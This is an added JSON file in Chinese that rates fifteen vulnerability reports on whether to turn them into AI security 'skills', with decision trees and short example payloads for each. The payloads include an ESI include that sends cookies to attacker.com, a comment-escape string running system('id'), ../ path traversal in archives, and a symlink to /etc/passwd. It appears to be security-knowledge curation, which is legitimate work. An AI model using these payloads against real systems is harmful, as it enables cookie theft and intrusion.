@@ -1,0 +1,431 @@
+{
+ "summary": {
+  "total": 15,
+  "worth_skill": 10,
+  "not_worth": 5,
+  "top_ids": [
+   312548,
+   1636382,
+   534794,
+   425314,
+   1439593,
+   622170,
+   364904,
+   1073780,
+   115857,
+   665798
+  ]
+ },
+ "detailed_evaluations": [
+  {
+   "id": 312548,
+   "knowledge_point": "Cookie domain 属性覆盖导致存储型 XSS",
+   "is_ai_likely_known": false,
+   "reason": "利用 Cookie domain 属性覆盖实现跨子域注入，属于较隐蔽的利用方式，AI 可能不熟悉具体细节。",
+   "scene_frequency": "中频",
+   "migration_potential": "高（可迁移到任何使用 Cookie 进行身份验证或状态管理的 Web 应用）",
+   "source_quality": "高",
+   "worth_skill": true,
+   "suggested_handling": "写成 Skill，固化 Cookie 安全配置与 domain 属性覆盖的检测与防御。",
+   "skill_framework": {
+    "name": "Cookie 安全配置与 domain 属性覆盖攻击",
+    "适用场景": [
+     "Web 应用 Cookie 管理",
+     "子域隔离",
+     "XSS 防护"
+    ],
+    "核心原理": [
+     "Cookie 的 domain 属性可被攻击者控制的子域覆盖",
+     "浏览器将 Cookie 发送到所有匹配的域"
+    ],
+    "决策树": [
+     "IF 应用使用 Cookie 且存在子域 → 检查 domain 属性是否可被覆盖",
+     "IF 可覆盖 → 尝试注入恶意 Cookie 实现 XSS"
+    ],
+    "示例": [
+     "攻击者控制 evil.example.com，设置 domain=.example.com 的 Cookie，影响 example.com"
+    ],
+    "迁移场景": [
+     "XSS",
+     "会话固定",
+     "CSRF"
+    ]
+   }
+  },
+  {
+   "id": 1636382,
+   "knowledge_point": "代码生成中的注释逃逸注入",
+   "is_ai_likely_known": false,
+   "reason": "利用多行注释逃逸注入代码，属于特定代码生成场景的绕过，AI 可能不熟悉。",
+   "scene_frequency": "中频",
+   "migration_potential": "高（可迁移到任何代码生成、模板渲染场景）",
+   "source_quality": "高",
+   "worth_skill": true,
+   "suggested_handling": "写成 Skill，固化代码生成安全编码与注释逃逸的检测。",
+   "skill_framework": {
+    "name": "代码生成中的注释逃逸与注入",
+    "适用场景": [
+     "代码生成器",
+     "模板引擎",
+     "自动化工具"
+    ],
+    "核心原理": [
+     "用户输入拼接进注释时，可利用注释结束符逃逸",
+     "逃逸后可注入任意代码"
+    ],
+    "决策树": [
+     "IF 存在代码生成且用户输入进入注释 → 尝试注入 */ 等注释结束符",
+     "IF 成功 → 尝试注入代码"
+    ],
+    "示例": [
+     "输入 */; system('id'); /* 逃逸注释"
+    ],
+    "迁移场景": [
+     "代码注入",
+     "模板注入",
+     "RCE"
+    ]
+   }
+  },
+  {
+   "id": 534794,
+   "knowledge_point": "导入功能路径遍历覆盖其他用户文件",
+   "is_ai_likely_known": false,
+   "reason": "利用导入功能结合路径遍历实现文件覆盖，属于特定功能滥用，AI 可能不熟悉。",
+   "scene_frequency": "中频",
+   "migration_potential": "高（可迁移到任何具有导入/导出功能的应用）",
+   "source_quality": "高",
+   "worth_skill": true,
+   "suggested_handling": "写成 Skill，固化导入功能安全与路径遍历的检测。",
+   "skill_framework": {
+    "name": "导入功能路径遍历与文件覆盖",
+    "适用场景": [
+     "文件导入/导出",
+     "项目管理",
+     "数据迁移"
+    ],
+    "核心原理": [
+     "导入时未校验文件路径，可包含 ../ 等遍历字符",
+     "覆盖其他用户文件"
+    ],
+    "决策树": [
+     "IF 存在导入功能 → 检查是否对文件名进行路径规范化",
+     "IF 未规范化 → 尝试上传包含 ../ 的文件"
+    ],
+    "示例": [
+     "上传 zip 包含 ../../victim/file 覆盖目标文件"
+    ],
+    "迁移场景": [
+     "路径遍历",
+     "IDOR",
+     "任意文件写入"
+    ]
+   }
+  },
+  {
+   "id": 425314,
+   "knowledge_point": "API 签名重放与 payload 修改",
+   "is_ai_likely_known": false,
+   "reason": "利用签名缓存与时间戳校验的时间差，属于特定实现细节，AI 可能不熟悉。",
+   "scene_frequency": "高频",
+   "migration_potential": "高（可迁移到任何使用签名认证的 API）",
+   "source_quality": "高",
+   "worth_skill": true,
+   "suggested_handling": "写成 Skill，固化 API 签名安全与重放攻击的检测。",
+   "skill_framework": {
+    "name": "API 签名重放与参数篡改",
+    "适用场景": [
+     "API 认证",
+     "支付接口",
+     "权限提升"
+    ],
+    "核心原理": [
+     "签名未包含完整请求数据，可重放签名但修改 payload",
+     "缓存时间与时间戳校验存在间隙"
+    ],
+    "决策树": [
+     "IF API 使用签名认证 → 检查签名是否覆盖所有参数",
+     "IF 未覆盖 → 尝试重放签名并修改参数"
+    ],
+    "示例": [
+     "截获合法请求，修改 payload 但保留签名，在缓存有效期内重放"
+    ],
+    "迁移场景": [
+     "重放攻击",
+     "权限提升",
+     "数据篡改"
+    ]
+   }
+  },
+  {
+   "id": 895778,
+   "knowledge_point": "多步攻击链：从信息泄露到提权",
+   "is_ai_likely_known": true,
+   "reason": "CTF 常见套路，AI 可能熟悉，但具体组合有启发性。",
+   "scene_frequency": "中频",
+   "migration_potential": "中（可迁移到综合渗透测试）",
+   "source_quality": "高",
+   "worth_skill": false,
+   "suggested_handling": "合并到上层系统 Skill：综合渗透测试方法论",
+   "skill_framework": null
+  },
+  {
+   "id": 1437004,
+   "knowledge_point": "IDOR 导致删除他人资源",
+   "is_ai_likely_known": true,
+   "reason": "IDOR 是常见漏洞，AI 可能熟悉。",
+   "scene_frequency": "高频",
+   "migration_potential": "中（可迁移到任何对象引用场景）",
+   "source_quality": "中",
+   "worth_skill": false,
+   "suggested_handling": "通用 Prompt 直接提问即可",
+   "skill_framework": null
+  },
+  {
+   "id": 79552,
+   "knowledge_point": "CRLF 注入绕过 CSRF",
+   "is_ai_likely_known": true,
+   "reason": "CRLF 注入是常见漏洞，AI 可能熟悉。",
+   "scene_frequency": "中频",
+   "migration_potential": "中（可迁移到 HTTP 头注入场景）",
+   "source_quality": "中",
+   "worth_skill": false,
+   "suggested_handling": "通用 Prompt 直接提问即可",
+   "skill_framework": null
+  },
+  {
+   "id": 1439593,
+   "knowledge_point": "tar 解压 symlink 导致任意文件读取",
+   "is_ai_likely_known": false,
+   "reason": "利用 tar 解压保留 symlink 的信任边界，属于特定解压库行为，AI 可能不熟悉。",
+   "scene_frequency": "中频",
+   "migration_potential": "高（可迁移到任何文件解压场景）",
+   "source_quality": "高",
+   "worth_skill": true,
+   "suggested_handling": "写成 Skill，固化文件解压安全与 symlink 攻击的检测。",
+   "skill_framework": {
+    "name": "文件解压安全与 symlink 攻击",
+    "适用场景": [
+     "文件上传",
+     "导入功能",
+     "备份恢复"
+    ],
+    "核心原理": [
+     "解压时未删除 symlink，后续处理跟随 symlink 读取文件",
+     "可读取任意文件"
+    ],
+    "决策树": [
+     "IF 存在文件解压 → 检查是否处理 symlink",
+     "IF 未处理 → 尝试上传包含 symlink 的压缩包"
+    ],
+    "示例": [
+     "上传 tar 包含 symlink 指向 /etc/passwd，解压后读取"
+    ],
+    "迁移场景": [
+     "任意文件读取",
+     "路径遍历",
+     "RCE"
+    ]
+   }
+  },
+  {
+   "id": 316713,
+   "knowledge_point": "zip 解压和 CSV 处理路径遍历",
+   "is_ai_likely_known": true,
+   "reason": "路径遍历是常见漏洞，AI 可能熟悉。",
+   "scene_frequency": "高频",
+   "migration_potential": "中（可迁移到文件处理场景）",
+   "source_quality": "中",
+   "worth_skill": false,
+   "suggested_handling": "合并到上层系统 Skill：文件上传与解压安全",
+   "skill_framework": null
+  },
+  {
+   "id": 622170,
+   "knowledge_point": "OpenSSL 默认配置路径劫持",
+   "is_ai_likely_known": false,
+   "reason": "利用 OpenSSL 在 Windows 上默认配置路径可写，属于特定库行为，AI 可能不熟悉。",
+   "scene_frequency": "低频",
+   "migration_potential": "高（可迁移到任何使用默认配置路径的库）",
+   "source_quality": "高",
+   "worth_skill": true,
+   "suggested_handling": "写成 Skill，固化默认配置路径安全与 DLL 劫持的检测。",
+   "skill_framework": {
+    "name": "默认配置路径劫持与 DLL 注入",
+    "适用场景": [
+     "桌面应用",
+     "服务端应用",
+     "库加载"
+    ],
+    "核心原理": [
+     "库使用默认配置路径，在 Windows 上可被低权限用户创建",
+     "加载恶意配置或 DLL"
+    ],
+    "决策树": [
+     "IF 应用使用 OpenSSL 等库 → 检查配置路径是否可写",
+     "IF 可写 → 尝试创建恶意配置文件"
+    ],
+    "示例": [
+     "创建 c:\\usr\\local\\ssl\\openssl.cnf 劫持配置"
+    ],
+    "迁移场景": [
+     "DLL 劫持",
+     "权限提升",
+     "任意代码执行"
+    ]
+   }
+  },
+  {
+   "id": 364904,
+   "knowledge_point": "Monero 交易 tx pubkey 重复导致金额虚报",
+   "is_ai_likely_known": false,
+   "reason": "利用协议字段重复性，属于特定区块链协议行为，AI 可能不熟悉。",
+   "scene_frequency": "低频",
+   "migration_potential": "高（可迁移到任何解析协议字段的应用）",
+   "source_quality": "高",
+   "worth_skill": true,
+   "suggested_handling": "写成 Skill，固化协议字段重复性漏洞的检测。",
+   "skill_framework": {
+    "name": "协议字段重复性漏洞",
+    "适用场景": [
+     "区块链交易解析",
+     "数据解析",
+     "API 参数处理"
+    ],
+    "核心原理": [
+     "协议允许字段重复，但应用未去重，导致逻辑错误",
+     "可放大金额或权限"
+    ],
+    "决策树": [
+     "IF 解析协议数据 → 检查是否对重复字段去重",
+     "IF 未去重 → 尝试构造重复字段"
+    ],
+    "示例": [
+     "Monero 交易 extra 字段重复 tx pubkey 导致金额重复计算"
+    ],
+    "迁移场景": [
+     "业务逻辑漏洞",
+     "金额篡改",
+     "权限提升"
+    ]
+   }
+  },
+  {
+   "id": 1073780,
+   "knowledge_point": "ESI 注入与 XSS 链式利用窃取 HttpOnly Cookie",
+   "is_ai_likely_known": false,
+   "reason": "利用 ESI 注入读取 HttpOnly Cookie，属于特定组件行为，AI 可能不熟悉。",
+   "scene_frequency": "中频",
+   "migration_potential": "高（可迁移到任何使用 ESI 的应用）",
+   "source_quality": "高",
+   "worth_skill": true,
+   "suggested_handling": "写成 Skill，固化 ESI 注入与 XSS 链式利用的检测。",
+   "skill_framework": {
+    "name": "ESI 注入与敏感信息窃取",
+    "适用场景": [
+     "Web 缓存",
+     "CDN",
+     "边缘计算"
+    ],
+    "核心原理": [
+     "ESI 注入可读取 HttpOnly Cookie",
+     "与 XSS 结合可窃取敏感数据"
+    ],
+    "决策树": [
+     "IF 应用使用 ESI → 检查输入是否可注入 ESI 标签",
+     "IF 可注入 → 尝试读取 Cookie"
+    ],
+    "示例": [
+     "注入 <esi:include src=\"http://attacker.com/?cookie=$HTTP_COOKIE\"/>"
+    ],
+    "迁移场景": [
+     "XSS",
+     "会话劫持",
+     "信息泄露"
+    ]
+   }
+  },
+  {
+   "id": 115857,
+   "knowledge_point": "ffmpeg 协议滥用导致 SSRF 和任意文件读取",
+   "is_ai_likely_known": false,
+   "reason": "利用 ffmpeg 的 concat 和 file:// 协议，属于特定组件行为，AI 可能不熟悉。",
+   "scene_frequency": "中频",
+   "migration_potential": "高（可迁移到任何使用 ffmpeg 处理用户输入的应用）",
+   "source_quality": "高",
+   "worth_skill": true,
+   "suggested_handling": "写成 Skill，固化 ffmpeg 安全配置与协议限制的检测。",
+   "skill_framework": {
+    "name": "ffmpeg 协议滥用与 SSRF",
+    "适用场景": [
+     "视频处理",
+     "文件转换",
+     "媒体上传"
+    ],
+    "核心原理": [
+     "ffmpeg 支持多种协议，未限制时可读取本地文件或发起请求",
+     "concat 协议可组合 file://"
+    ],
+    "决策树": [
+     "IF 应用使用 ffmpeg 处理用户输入 → 检查是否限制协议",
+     "IF 未限制 → 尝试构造恶意播放列表"
+    ],
+    "示例": [
+     "上传 HLS 播放列表包含 file:///etc/passwd"
+    ],
+    "迁移场景": [
+     "SSRF",
+     "任意文件读取",
+     "RCE"
+    ]
+   }
+  },
+  {
+   "id": 1089995,
+   "knowledge_point": "Onion-Location 头允许打开任意 URL",
+   "is_ai_likely_known": false,
+   "reason": "利用 Onion-Location 头未限制协议，属于特定浏览器行为，AI 可能不熟悉。",
+   "scene_frequency": "低频",
+   "migration_potential": "中（可迁移到浏览器协议处理）",
+   "source_quality": "高",
+   "worth_skill": false,
+   "suggested_handling": "合并到上层系统 Skill：浏览器协议处理安全",
+   "skill_framework": null
+  },
+  {
+   "id": 665798,
+   "knowledge_point": "DeFi 利率同步漏洞导致无风险套利",
+   "is_ai_likely_known": false,
+   "reason": "利用 DeFi 协议中利率累积机制的不同步，属于特定智能合约行为，AI 可能不熟悉。",
+   "scene_frequency": "低频",
+   "migration_potential": "高（可迁移到任何 DeFi 协议）",
+   "source_quality": "高",
+   "worth_skill": true,
+   "suggested_handling": "写成 Skill，固化 DeFi 利率同步漏洞的检测。",
+   "skill_framework": {
+    "name": "DeFi 利率同步漏洞与套利",
+    "适用场景": [
+     "DeFi 协议",
+     "智能合约审计",
+     "金融应用"
+    ],
+    "核心原理": [
+     "利率累积机制不同步，可在单笔交易内套利",
+     "利用 pot.drip 和 jug.drip 调用时机差异"
+    ],
+    "决策树": [
+     "IF DeFi 协议存在利率累积 → 检查是否同步更新",
+     "IF 不同步 → 尝试构造套利交易"
+    ],
+    "示例": [
+     "单笔交易内循环借贷和存款，赚取利息差"
+    ],
+    "迁移场景": [
+     "业务逻辑漏洞",
+     "经济攻击",
+     "套利"
+    ]
+   }
+  }
+ ]
+}
